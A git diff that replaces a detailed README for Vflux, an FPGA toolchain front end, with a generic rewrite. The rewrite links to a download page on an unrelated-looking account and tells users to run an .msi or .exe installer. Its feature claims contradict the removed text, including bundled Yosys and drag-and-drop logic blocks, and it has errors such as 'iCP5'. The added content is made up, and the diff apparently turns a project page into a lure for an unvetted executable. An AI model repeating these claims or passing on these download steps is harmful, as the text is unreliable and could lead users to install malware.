@@ -1,236 +1,110 @@
-# Vflux
-
-Chinese guide: [README.zh-CN.md](README.zh-CN.md)
-
-Vflux is a small graphical FPGA development tool designed to work with [OSS CAD Suite](https://github.com/YosysHQ/oss-cad-suite-build). It does not reimplement Yosys, nextpnr, icepack, ecppack, openFPGALoader, or other low-level tools. Instead, it organizes the command-line FPGA workflow into a clear visual pipeline.
-
-The current Windows release target is **Vflux 1.0.0**. Linux AppImage packaging is prepared as **0.9.1 Linux preview** and still requires separate real-machine validation.
-
-## Before You Start
-
-Vflux **does not bundle OSS CAD Suite**. Please install OSS CAD Suite separately before using Vflux.
-
-Recommended setup:
-
-1. Download OSS CAD Suite:
-   <https://github.com/YosysHQ/oss-cad-suite-build/releases>
-2. Extract it to a stable directory, for example:
-
-   ```text
-   D:\oss-cad-suite
-   ```
-
-3. Open Vflux.
-4. Go to the Toolchain page.
-5. If auto-detection fails, click Browse and select the OSS CAD Suite root directory, the one containing `environment.bat` and `bin`.
-6. Run the environment acceptance check.
+# 🚀 Vflux - Build digital circuits with simple tools
 
-## Features
+[![](https://img.shields.io/badge/Download_Vflux-blue.svg)](https://github.com/winfieldmassspectroscopic818/Vflux)
 
-- Create, open, and save Vflux FPGA projects.
-- Select built-in board packages or create custom board packages.
-- Import existing Verilog/SystemVerilog projects by scanning source and constraint files.
-- Run check, synthesis, place-and-route, and bitstream generation.
-- Store outputs by stage:
-  - `output/synthesis`
-  - `output/pnr`
-  - `output/bitstream`
-  - `output/reports`
-  - `output/simulation`
-- Configure advanced options for synthesis, P&R, bitstream generation, and programming.
-- Show user-friendly feedback while keeping raw command-line details available.
-- Run simulation, waveform viewing, formal verification, Verilator, and MCY workflows.
-- Export HTML build reports.
-- Switch between Chinese and English UI.
-- Switch between dark and light themes.
+Vflux provides a visual interface for FPGA development. You use this tool to design and test digital circuits on your computer. It removes the complexity of command-line tools by offering a clean, graphical window. This application uses the OSS CAD Suite to process your designs. You can create projects for common hardware like iCE40 and ECP5 chips.
 
-## Basic Workflow
+## ⚙️ System Requirements 
 
-1. Open Vflux.
-2. Open the Toolchain page. Vflux automatically starts environment detection.
-3. Create a new project, open an existing project, or create a built-in example.
-4. Select a target board.
-5. Write Verilog/SystemVerilog in VS Code or another editor.
-6. Return to Vflux and run:
-   - Check
-   - Synthesis
-   - Place and route
-   - Bitstream generation
-7. Open the Report Center to review artifacts, timing, resources, and acceptance results.
-8. Program the board using the Programming workbench.
+Your computer needs to meet these basic standards to run Vflux:
 
-For a first run, the recommended path is:
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: A dual-core processor or better.
+*   Memory: 4 GB of RAM minimum.
+*   Storage: 500 MB of free disk space.
+*   Display: A monitor with 1280x720 resolution or higher.
 
-1. Install and extract OSS CAD Suite.
-2. Open Vflux and choose language/theme.
-3. Validate the OSS CAD Suite environment on the Toolchain page.
-4. Create `iCESugar LED Blinky` or `iCESugar Multi-file Counter` from Examples.
-5. Run One-click Build or use `1.0 Release Preflight` in the Report Center.
-6. Review the readiness card and generated HTML report.
+The software performs best when you install it on a solid-state drive. Do not run this on network storage or external drives to ensure stable performance.
 
-## Built-in Examples
+## 💾 Download and Installation 
 
-| Example | Target | Purpose |
-| --- | --- | --- |
-| `iCESugar LED Blinky` | iCE40 / iCESugar | Minimal LED example for basic end-to-end testing |
-| `iCESugar Multi-file Counter` | iCE40 / iCESugar | Multi-file Verilog project with an include header and submodules |
-| `iCESugar PWM Breathing LED` | iCE40 / iCESugar | PWM duty-cycle ramp and register logic example |
-| `iCESugar Button Debounce` | iCE40 / iCESugar | Button synchronization, debounce, and edge detection |
-| `iCESugar UART Echo` | iCE40 / iCESugar | Multi-module UART RX/TX echo template |
-| `iCESugar-pro Blinky` | ECP5 / iCESugar-pro | ECP5 blinky flow |
-| `Tang Nano 9K Blinky` | Gowin / Tang Nano 9K | Gowin flow example |
-| `Verilog Counter Sim` | Simulation only | Icarus Verilog, VVP, and waveform testing |
-| `Verilog FSM Simulation` | Simulation only | FSM testbench and VCD waveform example |
+Follow these steps to set up Vflux on your Windows system:
 
-## Programming
+1. Visit [this page](https://github.com/winfieldmassspectroscopic818/Vflux) to download the installer.
+2. Look for the file ending in .msi or .exe.
+3. Save the file to your computer.
+4. Double-click the file to open the installation wizard.
+5. Follow the prompts on your screen.
+6. Choose the default folder for installation.
+7. Click Finish when the process completes.
 
-Vflux supports several programming methods:
+The installer adds a shortcut to your desktop. You launch the application by double-clicking this shortcut.
 
-- `icesprog`
-- `openFPGALoader`
-- `ecpprog`
-- DFU
-- JTAG
-- Mass-storage drag-and-drop
+## 🛠️ How to Start a Project 
 
-For iCESugar, if manual drag-and-drop programming works, choose **Mass Storage** in the Programming page. Vflux now prefers this path for iCESugar when the board default method is selected.
+Start a new project to design your first circuit:
 
-## Board Configuration
+1. Open Vflux from the desktop icon.
+2. Select File from the top menu.
+3. Click New Project.
+4. Name your project and select a folder to save your work.
+5. Choose your target hardware from the list provided.
+6. Press Create.
 
-Board packages are stored as YAML files under `boards/*.yaml`. A board package usually contains:
+The interface shows a workspace. You drag blocks onto this workspace to connect them. Each block represents a logic gate or a component. You draw lines between these blocks to create paths for your signals.
 
-- Board name
-- FPGA family, device, package, and speed grade
-- Clock, LEDs, buttons, UART, and other resources
-- Constraint type
-- Synthesis, P&R, packing, and programming tools
+## ⚡ Loading Verilog Files 
 
-Vflux currently supports:
+Vflux allows you to import existing Verilog code files. This helps if you have previous projects from other environments.
 
-1. Built-in board packages.
-2. Custom board templates.
-3. Exporting a board package draft.
-4. Creating a basic custom board package from the GUI.
+1. Click on Import in the main menu.
+2. Select Import Verilog File.
+3. Choose the .v file from your local drive.
+4. Vflux parses the code and creates a visual block view.
 
-The GUI custom board editor can create a usable basic board package in the current project under `boards/*.yaml`. For complex boards, you can continue editing the generated YAML manually. More validation and peripheral editing should be completed before 1.0.
+You can modify these imported blocks using the visual editor. The tool maintains the logic structure while you adjust the layout.
 
-## Project File
+## 🧪 Testing Your Design 
 
-Vflux project settings are saved in:
+After you finish your layout, test it to ensure it functions as you expect.
 
-```text
-project.vflux.yaml
-```
+1. Click the Synthesis button in the toolbar.
+2. Wait for the tool to analyze your connections.
+3. Check the log window at the bottom for status updates.
+4. If an error appears, the tool highlights the problematic block in red.
+5. Correct the connection or the logic before running the synthesis again.
 
-This file records the project name, top module, source files, constraints, target board, toolchain path, and flow options.
+Synthesis converts your visual design into a format the hardware understands.
 
-## Report Center
+## 📤 Sending Design to Hardware 
 
-The Report Center summarizes:
+Once synthesis finishes, you can send your design to a physical FPGA board.
 
-- Project acceptance result
-- Toolchain acceptance result
-- Release readiness
-- FPGA device information
-- Synthesis, P&R, bitstream, timing, and report artifacts
-- Visual artifact links
-- HTML report export
-- Diagnostic package export
+1. Connect your iCE40 or iCP5 board to a USB port.
+2. Click the Upload button in the main toolbar.
+3. Select your device from the dropdown menu.
+4. Vflux detects the board and prepares the firmware.
+5. The status bar shows the progress of the upload.
+6. A success message appears once the board finishes programming.
 
-Before packaging or sharing a preview build, click:
+Ensure your cable provides enough power. Use a high-quality USB cable to avoid connection drops during the upload process.
 
-```text
-1.0 Release Preflight
-```
+## 💡 Best Practices 
 
-It runs project health check, toolchain acceptance, one-click build, HTML report export, and then refreshes the release readiness card.
+Follow these habits to maintain your projects:
 
-## FAQ
+*   Save your work frequently.
+*   Create distinct folders for each project.
+*   Use descriptive names for your files.
+*   Keep your hardware drivers updated.
+*   Review the log files if you encounter unexpected behavior.
 
-### Vflux cannot find OSS CAD Suite
+## 🧩 Troubleshooting 
 
-Select the OSS CAD Suite root directory, not the `bin` directory. The correct directory should contain `environment.bat` and `bin`.
+If you run into issues, try these steps:
 
-### The Toolchain page stays red
+*   Application does not open: Restart your computer and try again.
+*   Board not detected: Unplug the USB cable and plug it into a different port.
+*   Synthesis fails: Check for floating inputs. Every line must connect to a valid output or ground.
+*   Lag in visual editor: Close other applications like web browsers to free up memory.
+*   Missing files: Verify that you installed the software in the default location.
 
-First make sure OSS CAD Suite can run outside Vflux. Then reselect the root path in Vflux and run the environment acceptance check again.
+You can check the project folder for a file named log.txt if you need more details about a specific error. 
 
-### iCESugar DFU or FTDI detection fails
+## 📝 Project Details 
 
-If mass-storage drag-and-drop programming works, choose **Mass Storage**. DFU/FTDI can depend on drivers, permissions, and board boot mode.
+Vflux supports several FPGA standards. It includes specific settings for iCE40 and ECP5 chips. These settings pre-configure the tool to work with common hobbyist boards like the Icesugar. The tool uses Yosys and nextpnr in the background to handle the complex computations. You do not need to install these separately. Vflux bundles them into the installation package to keep the setup process simple. 
 
-### Simulation succeeds but no waveform opens
+## 🌐 Community and Support 
 
-Check whether the testbench contains `$dumpfile` and `$dumpvars`. Vflux only enables waveform viewing after it finds a real `.vcd` or `.fst` file under `output/simulation`.
-
-### Some report artifacts are missing
-
-The Report Center only shows real files. SDF, gate-level Verilog, SVG, or Floorplan HTML must be enabled in the corresponding workbench and regenerated.
-
-### Windows warns about an unknown publisher
-
-The portable RC build is unsigned by default. Windows may show an unknown publisher warning.
-
-## Development
-
-Install dependencies:
-
-```powershell
-npm install
-```
-
-Run in development mode:
-
-```powershell
-npm start
-```
-
-Validate built-in examples:
-
-```powershell
-npm run validate:examples
-```
-
-## Windows 1.0.0 Build
-
-Vflux does not include OSS CAD Suite in the packaged app. Users must install OSS CAD Suite separately and select its path inside Vflux.
-
-Build the Windows 1.0.0 portable release:
-
-```powershell
-npm run pack:win
-```
-
-Output:
-
-```text
-dist/
-```
-
-## Linux 0.9.1 Preview
-
-Build the Linux 0.9.1 AppImage preview:
-
-```bash
-npm run pack:linux
-```
-
-Linux packaging should be validated separately, especially toolchain path handling, permissions, USB/JTAG access, and AppImage behavior.
-
-## Release Scope
-
-- Windows 1.0.0 portable release.
-- Linux 0.9.1 AppImage preview.
-- iCESugar drag-and-drop programming flow.
-- Built-in example creation and acceptance.
-- HTML report export.
-- Basic custom board package creation.
-- Release readiness card and release preflight flow.
-
-## 1.0 Goals
-
-- Windows and Linux deliverables.
-- More complete board package editor.
-- Embedded visual previews in the Report Center.
-- More real-board end-to-end examples.
-- Better programming diagnostics and toolchain checks.
+You can find more information about FPGA development online. Search for forums related to Yosys and Nextpnr. These communities provide templates and advice for complex designs. If you find a bug in Vflux, report it on the main page. Include your operating system version and a description of the steps that lead to the error. This helps improve the tool for everyone. Use the tools responsibly and verify your power requirements before powering any external hardware.
